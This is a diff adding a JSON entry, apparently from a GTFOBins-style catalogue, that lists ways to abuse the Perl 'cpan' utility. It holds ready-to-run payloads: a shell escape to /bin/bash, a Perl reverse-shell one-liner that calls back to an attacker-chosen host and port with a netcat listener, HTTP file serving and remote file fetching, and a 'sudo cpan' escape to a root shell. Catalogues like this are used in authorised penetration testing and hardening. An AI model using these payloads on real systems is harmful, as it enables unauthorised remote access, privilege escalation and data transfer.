@@ -1,0 +1,33 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "'cpan' lets you execute perl commands with the '! command'.\n",
+        "code": "cpan\n! exec '/bin/bash'\n"
+      }
+    ],
+    "reverse-shell": [
+      {
+        "description": "Run 'nc -lvp [port]' on the attacker box to receive the shell.",
+        "code": "export RHOST=[host]\nexport RPORT=[port]\ncpan\n! use Socket; my $i=\"$ENV{RHOST}\"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "Serve files in the local folder running an HTTP server on port 8080. Install the dependency via 'cpan HTTP::Server::Simple'.",
+        "code": "cpan\n! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch a remote file via an HTTP GET request and store it in 'PWD'.",
+        "code": "export URL=[host]/[file]\ncpan\n! use File::Fetch; my $file = (File::Fetch->new(uri => \"$ENV{URL}\"))->fetch();\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo cpan\n! exec '/bin/bash'\n"
+      }
+    ]
+  }
+}
